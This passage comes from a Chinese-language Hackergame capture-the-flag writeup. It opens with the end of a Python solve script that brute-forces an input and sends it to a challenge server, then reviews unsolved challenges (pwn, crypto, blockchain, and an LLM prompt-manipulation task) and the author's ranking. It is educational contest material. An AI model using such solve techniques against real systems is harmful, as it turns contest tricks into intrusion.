		if random_vector[i]==256:
			has_256=True
			break
	if not (has_256 or all_zero):
		target_input=bytes(random_vector)
		break
print(target_input.hex())

conn.recvuntil(b">")
conn.send(target_input.hex().encode())
conn.send(b"\n")

conn.interactive()
```

## 关于其他未解出的题目

以上就是我所有解出的题目的 Writeup 了。这里我再大致评论一下我没解出的题目：
- 旅行照片 3.0 - 后会有期，学长！：终于有能击败电子幽灵的搜索题目了。首先，我漏掉了学长身上的会议绳带信息，导致做不出第五题。其次我漏掉了任天堂 logo 下面的 TOKYO 字样，把马里奥世界当成了大坂环球影城的任天堂区域，导致做不出第六题的后半。最后，我以为这个品牌的活动只是一般的宣传，没能搜索到第六题的前半。真是完败啊！下次还是得把图片的每个像素都仔细看一遍。
- 🪐 小型大语言模型星球 - Accepted/Hackergame/🐮：我十分不了解大语言模型，也不懂 prompt engineering。第二问想到了能够暴力搜索，但是没能进行实现，有点可惜。至于后面的部分，就只能看题解学习了。
- 🪐 低带宽星球 - 极致压缩：确实想到了看 libvips 支持什么格式，然而没能查到列表。不过官方题解使用 JXL 这种很新的格式也是开了眼界。
- 链上猎手：本届的区块链题明显比往届复杂，所以完全放弃了本题。看题解的话，第一小题还是不那么复杂的，至于后面的就只能学习一个了。
- It's MyCalculator!!!!!：没有看出来可以通过整数溢出写到 buffer 的负数位置，算是失误，但是后面的部分好像也有些复杂，没做出来情有可原。
- 黑客马拉松：需要一些数学，看题解是需要 Coppersmith，总之学习一个。
- 不可加密的异世界 2 - 希尔之秘：想到了是格上的 CVP 问题，但是没有去实现，有些可惜。
- 旧日之痕：由于是压轴题所以没有尝试，看上去是与二进制水印有关，总之学习一个。

## 总结

今年拿到了 11 名，和往年相比有些上升。拿到了 6400/10000 分，和去年在比例上也略有上升。看来与往年相比今年还是有所进步。不过感觉今年的难度曲线要更陡峭一些，不知道是不是错觉。

不过今年没有像去年 Writeup 里说的一样重新爆破一个 Tag，希望下次可以实现。

总之，明年有空一定还来。